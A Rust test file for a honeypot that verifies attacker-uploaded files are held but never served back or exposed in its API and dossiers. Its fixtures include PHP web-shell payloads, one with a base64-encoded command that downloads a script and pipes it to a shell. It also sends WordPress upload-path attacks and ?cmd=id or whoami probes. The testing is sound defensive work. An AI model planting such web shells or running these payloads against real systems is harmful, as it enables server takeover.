//! Dropped files are never served (MIK-121 §5.1): whatever the trap
//! answers, at a file's answered path or anywhere else, carries none of
//! the bytes it kept. And no code but the upload store reads them. Text
//! uploads are parsed and shown escaped on admin pages only; the API and
//! the dossiers stay metadata-only. Binaries are never parsed.
use peephole::config::Config;
use peephole::store::Store;
use peephole::trap::{self, TrapState};
use std::path::Path;
use std::sync::Arc;

/// A trap that answers once what it records is written, recording every
/// request (no flood gate).
async fn spawn() -> (String, Store, tempfile::TempDir) {
    let dir = tempfile::tempdir().unwrap();
    let cfg_path = dir.path().join("c.toml");
    std::fs::write(
        &cfg_path,
        format!(
            "trap_listen = \"127.0.0.1:0\"\ndatabase_path = \"{db}\"\ndata_dir = \"{d}\"\n\
             trusted_proxies = [\"127.0.0.1/32\"]\n[roles]\nweb = false\n[trap]\nrecord_rate = 0\n",
            db = dir.path().join("t.db").display(),
            d = dir.path().display()
        ),
    )
    .unwrap();
    let cfg = Config::load(&cfg_path).unwrap();
    let store = Store::connect(&cfg.database_path).await.unwrap();
    let state = Arc::new(TrapState::for_test(store.clone(), cfg));
    let settled = state.clone();
    let app = trap::router(state).layer(axum::middleware::map_response(
        move |r: axum::response::Response| {
            let state = settled.clone();
            async move {
                state.guards.settled().await;
                r
            }
        },
    ));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(
            listener,
            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
        )
        .await
        .unwrap()
    });
    (format!("http://{addr}"), store, dir)
}

fn multipart(field: &str, file: &str, data: &[u8]) -> (String, Vec<u8>) {
    let mut b = format!(
        "--b0undary\r\nContent-Disposition: form-data; name=\"{field}\"; filename=\"{file}\"\r\n\
         Content-Type: application/octet-stream\r\n\r\n"
    )
    .into_bytes();
    b.extend_from_slice(data);
    b.extend_from_slice(b"\r\n--b0undary--\r\n");
    ("multipart/form-data; boundary=b0undary".into(), b)
}

/// Send a request and return its status line, headers and body as one
/// text, to search for the marker anywhere in the response.
async fn send(
    base: &str,
    method: &str,
    path: &str,
    ip: &str,
    ct: Option<&str>,
    body: Vec<u8>,
) -> String {
    let mut r = reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap()
        .request(method.parse().unwrap(), format!("{base}{path}"))
        .header("x-forwarded-for", ip)
        .body(body);
    if let Some(ct) = ct {
        r = r.header("content-type", ct);
    }
    let r = r.send().await.unwrap();
    let mut all = format!("{}\n", r.status());
    for (k, v) in r.headers() {
        all.push_str(&format!("{k}: {}\n", String::from_utf8_lossy(v.as_bytes())));
    }
    all.push_str(&String::from_utf8_lossy(&r.bytes().await.unwrap()));
    all
}

#[tokio::test]
async fn no_trap_response_carries_a_dropped_file() {
    let (base, store, _dir) = spawn().await;
    let marker = format!("MARK{}", uuid::Uuid::new_v4().simple());
    let content = |kind: &str| format!("<?php /* {marker} {kind} */ system($_REQUEST['cmd']);");
    let mut answers = vec![];
    let put = content("put");
    answers.push(
        send(
            &base,
            "PUT",
            "/x/a.php",
            "203.0.113.60",
            None,
            put.into_bytes(),
        )
        .await,
    );
    for (kind, path, field, file) in [
        (
            "wp_plugin",
            "/wp-admin/update.php?action=upload-plugin",
            "pluginzip",
            "shell.zip",
        ),
        (
            "wp_theme",
            "/wp-admin/update.php?action=upload-theme",
            "themezip",
            "dark.zip",
        ),
        (
            "wp_media",
            "/wp-admin/async-upload.php",
            "async-upload",
            "img.php",
        ),
        ("script", "/upload.php", "file", "x.php"),
    ] {
        let (ct, b) = multipart(field, file, content(kind).as_bytes());
        answers.push(send(&base, "POST", path, "203.0.113.61", Some(&ct), b).await);
    }
    let rows: Vec<(String, String, bool, String)> = sqlx::query_as(
        "SELECT kind, answered_path, path_is_prefix, content_state FROM uploads ORDER BY id",
    )
    .fetch_all(&store.pool)
    .await
    .unwrap();
    let kinds: Vec<&str> = rows.iter().map(|r| r.0.as_str()).collect();
    assert_eq!(
        kinds,
        ["put", "wp_plugin", "wp_theme", "wp_media", "script"]
    );
    assert!(rows.iter().all(|r| r.3 == "held"), "{rows:?}");
    let held: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM upload_blobs")
        .fetch_one(&store.pool)
        .await
        .unwrap();
    assert_eq!(held, 5);

    let form = Some("application/x-www-form-urlencoded");
    for (_, answered, prefix, _) in &rows {
        let mut paths = vec![answered.clone()];
        if *prefix {
            paths.push(format!("{answered}shell.php"));
            paths.push(format!("{answered}{}.php", marker.to_lowercase()));
        }
        for p in &paths {
            for q in ["", "?cmd=id", "?cmd=cat+x.php", "?c=whoami", "?cmd="] {
                for m in ["GET", "POST", "HEAD"] {
                    let path = format!("{p}{q}");
                    answers.push(send(&base, m, &path, "198.51.100.20", None, vec![]).await);
                }
            }
            for b in ["cmd=id", "cmd=type+x.php", "x=ls"] {
                let b = b.as_bytes().to_vec();
                answers.push(send(&base, "POST", p, "198.51.100.21", form, b).await);
            }
        }
    }
    assert!(answers.len() > 100);
    for a in &answers {
        assert!(
            !a.contains(&marker),
            "a trap answer carries a dropped file:\n{a}"
        );
    }
}

/// The dossiers of a request that carried an upload and of its sender hold
/// no byte of the file: the admin pages parse text uploads, nothing else
/// does. (The API's own pages are checked in `admin::api_v1`.)
#[tokio::test]
async fn api_and_dossier_carry_no_upload_text() {
    let (base, store, dir) = spawn().await;
    let marker = format!("MARK{}", uuid::Uuid::new_v4().simple());
    let text = format!(
        "<?php /* {marker} */ system(base64_decode('d2dldCBodHRwOi8vMTkyLjAuMi45L3guc2ggLU8tIHwgc2g='));"
    );
    let a = send(
        &base,
        "PUT",
        "/x/a.php",
        "203.0.113.70",
        None,
        text.clone().into_bytes(),
    )
    .await;
    assert!(!a.contains(&marker));
    let (id, uid): (i64, String) = sqlx::query_as(
        "SELECT r.id, u.uid FROM uploads u JOIN requests r ON r.uid = u.request_uid",
    )
    .fetch_one(&store.pool)
    .await
    .unwrap();
    let cfg = Config::load(&dir.path().join("c.toml")).unwrap();
    let state = peephole::admin::AdminState::public_only(store.clone(), cfg);
    let request = peephole::admin::dossier::request(&state, &id.to_string())
        .await
        .unwrap()
        .unwrap();
    let ip = peephole::admin::dossier::ip(&state, "203.0.113.70")
        .await
        .unwrap()
        .unwrap();
    for (what, json) in [
        ("request", serde_json::to_string(&request).unwrap()),
        ("ip", serde_json::to_string(&ip).unwrap()),
    ] {
        assert!(!json.contains(&marker), "{what} dossier: {json}");
    }
    let mut conn = store.read.acquire().await.unwrap();
    let row = peephole::store::uploads::get(&mut conn, &uid)
        .await
        .unwrap()
        .unwrap();
    // The only reader, and only for text.
    let got = peephole::store::uploads::text_for_xray(&mut conn, &row)
        .await
        .unwrap();
    assert_eq!(got.as_deref(), Some(text.as_bytes()));
}

/// Every file under `dir`, recursively.
fn files(dir: &Path, out: &mut Vec<std::path::PathBuf>) {
    for e in std::fs::read_dir(dir).unwrap() {
        let p = e.unwrap().path();
        if p.is_dir() {
            files(&p, out);
        } else {
            out.push(p);
        }
    }
}

/// Only the upload store touches the content table, so only it can read
/// the content: the trap, the admin and the exports go through it.
#[test]
fn only_the_upload_store_names_the_content_table() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let mut all = vec![];
    files(&root.join("src"), &mut all);
    files(&root.join("templates"), &mut all);
    let mut naming: Vec<String> = all
        .iter()
        .filter(|p| {
            std::fs::read(p)
                .map(|b| String::from_utf8_lossy(&b).contains("upload_blobs"))
                .unwrap_or(false)
        })
        .map(|p| p.strip_prefix(root).unwrap().display().to_string())
        .collect();
    naming.sort();
    assert_eq!(
        naming,
        [
            "src/store/migrations/0034_uploads.sql",
            "src/store/uploads.rs"
        ]
    );
}
